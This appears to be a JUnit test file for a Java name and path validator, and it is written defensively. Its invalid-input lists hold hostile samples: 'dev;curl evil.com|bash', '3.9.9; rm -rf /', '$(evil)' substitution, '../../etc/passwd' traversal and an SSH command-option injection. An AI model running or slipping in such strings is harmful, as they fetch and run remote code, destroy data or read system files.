/*
 * Copyright (c) 2026 Standard Applied Intelligence Labs
 * SPDX-License-Identifier: MIT
 */

package ai.singlr.sail.engine;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

class NameValidatorTest {

  @ParameterizedTest
  @ValueSource(strings = {"acme", "my-project", "project1", "a", "0", "a1b2-c3"})
  void validProjectNames(String name) {
    assertDoesNotThrow(() -> NameValidator.requireValidProjectName(name));
  }

  @ParameterizedTest
  @ValueSource(strings = {"-bad", "Bad", "has space", "has.dot", "../traversal", "a/b", ""})
  void invalidProjectNames(String name) {
    var ex =
        assertThrows(
            IllegalArgumentException.class, () -> NameValidator.requireValidProjectName(name));
    assertTrue(ex.getMessage().contains("Invalid project name"));
  }

  @Test
  void nullProjectNameIsInvalid() {
    assertThrows(IllegalArgumentException.class, () -> NameValidator.requireValidProjectName(null));
  }

  @Test
  void projectNameAtMaxLengthIsValid() {
    var name = "a".repeat(63);
    assertDoesNotThrow(() -> NameValidator.requireValidProjectName(name));
  }

  @Test
  void projectNameExceedingMaxLengthIsInvalid() {
    var name = "a".repeat(64);
    assertThrows(IllegalArgumentException.class, () -> NameValidator.requireValidProjectName(name));
  }

  @ParameterizedTest
  @ValueSource(strings = {"oauth-flow", "search-api", "v2-upgrade", "a", "0"})
  void validSpecIds(String specId) {
    assertDoesNotThrow(() -> NameValidator.requireValidSpecId(specId));
  }

  @ParameterizedTest
  @ValueSource(strings = {"Bad", "has space", "deep/path", "../escape", "", "-bad"})
  void invalidSpecIds(String specId) {
    var ex =
        assertThrows(
            IllegalArgumentException.class, () -> NameValidator.requireValidSpecId(specId));
    assertTrue(ex.getMessage().contains("Invalid spec id"));
  }

  @Test
  void nullSpecIdIsInvalid() {
    assertThrows(IllegalArgumentException.class, () -> NameValidator.requireValidSpecId(null));
  }

  @ParameterizedTest
  @ValueSource(strings = {"snap-20260220-123456", "v1.0", "before-refactor", "A_B.c-d"})
  void validSnapshotLabels(String label) {
    assertDoesNotThrow(() -> NameValidator.requireValidSnapshotLabel(label));
  }

  @ParameterizedTest
  @ValueSource(strings = {"-bad", ".bad", "has space", "../traversal", "a/b", ""})
  void invalidSnapshotLabels(String label) {
    var ex =
        assertThrows(
            IllegalArgumentException.class, () -> NameValidator.requireValidSnapshotLabel(label));
    assertTrue(ex.getMessage().contains("Invalid snapshot label"));
  }

  @Test
  void nullSnapshotLabelIsInvalid() {
    assertThrows(
        IllegalArgumentException.class, () -> NameValidator.requireValidSnapshotLabel(null));
  }

  @Test
  void snapshotLabelAtMaxLengthIsValid() {
    var label = "a".repeat(63);
    assertDoesNotThrow(() -> NameValidator.requireValidSnapshotLabel(label));
  }

  @Test
  void snapshotLabelExceedingMaxLengthIsInvalid() {
    var label = "a".repeat(64);
    assertThrows(
        IllegalArgumentException.class, () -> NameValidator.requireValidSnapshotLabel(label));
  }

  @ParameterizedTest
  @ValueSource(strings = {"postgres", "redis-7", "my_service.v2", "Kafka"})
  void validServiceNames(String service) {
    assertDoesNotThrow(() -> NameValidator.requireValidServiceName(service));
  }

  @ParameterizedTest
  @ValueSource(strings = {"--help", "-f", "../bad", "has space", ""})
  void invalidServiceNames(String service) {
    var ex =
        assertThrows(
            IllegalArgumentException.class, () -> NameValidator.requireValidServiceName(service));
    assertTrue(ex.getMessage().contains("Invalid service name"));
  }

  @Test
  void nullServiceNameIsInvalid() {
    assertThrows(IllegalArgumentException.class, () -> NameValidator.requireValidServiceName(null));
  }

  @Test
  void serviceNameAtMaxLengthIsValid() {
    var name = "a".repeat(63);
    assertDoesNotThrow(() -> NameValidator.requireValidServiceName(name));
  }

  @Test
  void serviceNameExceedingMaxLengthIsInvalid() {
    var name = "a".repeat(64);
    assertThrows(IllegalArgumentException.class, () -> NameValidator.requireValidServiceName(name));
  }

  @ParameterizedTest
  @ValueSource(strings = {"dev", "root", "alice", "_service", "build-agent", "user_01"})
  void validSshUsers(String user) {
    assertDoesNotThrow(() -> NameValidator.requireValidSshUser(user));
  }

  @ParameterizedTest
  @ValueSource(
      strings = {
        "Dev",
        "has space",
        "dev;curl evil.com|bash",
        "../etc",
        "",
        "1bad",
        "-bad",
        "user@host"
      })
  void invalidSshUsers(String user) {
    var ex =
        assertThrows(IllegalArgumentException.class, () -> NameValidator.requireValidSshUser(user));
    assertTrue(ex.getMessage().contains("Invalid ssh.user"));
  }

  @Test
  void nullSshUserIsInvalid() {
    assertThrows(IllegalArgumentException.class, () -> NameValidator.requireValidSshUser(null));
  }

  @Test
  void sshUserExceedingMaxLengthIsInvalid() {
    var user = "a".repeat(33);
    assertThrows(IllegalArgumentException.class, () -> NameValidator.requireValidSshUser(user));
  }

  @ParameterizedTest
  @ValueSource(strings = {"22", "3.9.9", "24.13.1", "1.0.0.0", "25"})
  void validVersions(String version) {
    assertDoesNotThrow(() -> NameValidator.requireValidVersion(version, "runtimes.node"));
  }

  @ParameterizedTest
  @ValueSource(
      strings = {
        "3.9.9$(evil)",
        "22.x",
        "latest",
        "v1.0",
        "3.9.9; rm -rf /",
        "",
        ".",
        ".1",
        "1.",
        "1..2"
      })
  void invalidVersions(String version) {
    assertThrows(
        IllegalArgumentException.class,
        () -> NameValidator.requireValidVersion(version, "runtimes.node"));
  }

  @Test
  void nullVersionIsInvalid() {
    assertThrows(
        IllegalArgumentException.class,
        () -> NameValidator.requireValidVersion(null, "runtimes.maven"));
  }

  @ParameterizedTest
  @ValueSource(strings = {"acme-backend", "app/webapp", "deep/nested/path", "v2.0-beta"})
  void validSafePaths(String path) {
    assertDoesNotThrow(() -> NameValidator.requireSafePath(path, "repos[].path"));
  }

  @ParameterizedTest
  @ValueSource(strings = {"../../etc/passwd", "../parent", "path/../escape", ".hidden", "", "/abs"})
  void invalidSafePaths(String path) {
    assertThrows(
        IllegalArgumentException.class, () -> NameValidator.requireSafePath(path, "repos[].path"));
  }

  @Test
  void nullSafePathIsInvalid() {
    assertThrows(
        IllegalArgumentException.class, () -> NameValidator.requireSafePath(null, "repos[].path"));
  }

  @ParameterizedTest
  @ValueSource(strings = {"main", "develop", "feature/my-branch", "v1.0.0", "release/2.0"})
  void validGitRefs(String ref) {
    assertDoesNotThrow(() -> NameValidator.requireValidGitRef(ref, "repos[].branch"));
  }

  @ParameterizedTest
  @ValueSource(strings = {"../escape", "branch..lock", ".hidden", "", "-bad"})
  void invalidGitRefs(String ref) {
    assertThrows(
        IllegalArgumentException.class,
        () -> NameValidator.requireValidGitRef(ref, "repos[].branch"));
  }

  @ParameterizedTest
  @ValueSource(strings = {"acme-org/backend", "org/repo", "my.org/my-repo", "a/b"})
  void validGitHubRepos(String repo) {
    assertDoesNotThrow(() -> NameValidator.requireValidGitHubRepo(repo));
  }

  @ParameterizedTest
  @ValueSource(strings = {"noslash", "too/many/parts", "../bad/repo", "", "a/", "/b"})
  void invalidGitHubRepos(String repo) {
    assertThrows(IllegalArgumentException.class, () -> NameValidator.requireValidGitHubRepo(repo));
  }

  @Test
  void nullGitHubRepoIsInvalid() {
    assertThrows(IllegalArgumentException.class, () -> NameValidator.requireValidGitHubRepo(null));
  }

  @ParameterizedTest
  @ValueSource(strings = {"uday", "e2e-member", "Ada.Lovelace_1", "a"})
  void validFdeHandles(String handle) {
    assertDoesNotThrow(() -> NameValidator.requireValidFdeHandle(handle));
  }

  @ParameterizedTest
  @ValueSource(strings = {"a\",command=\"x", "two\nlines", "has space", "", "-lead", ".lead"})
  void invalidFdeHandles(String handle) {
    assertThrows(IllegalArgumentException.class, () -> NameValidator.requireValidFdeHandle(handle));
  }

  @Test
  void nullFdeHandleIsInvalid() {
    assertThrows(IllegalArgumentException.class, () -> NameValidator.requireValidFdeHandle(null));
  }
}
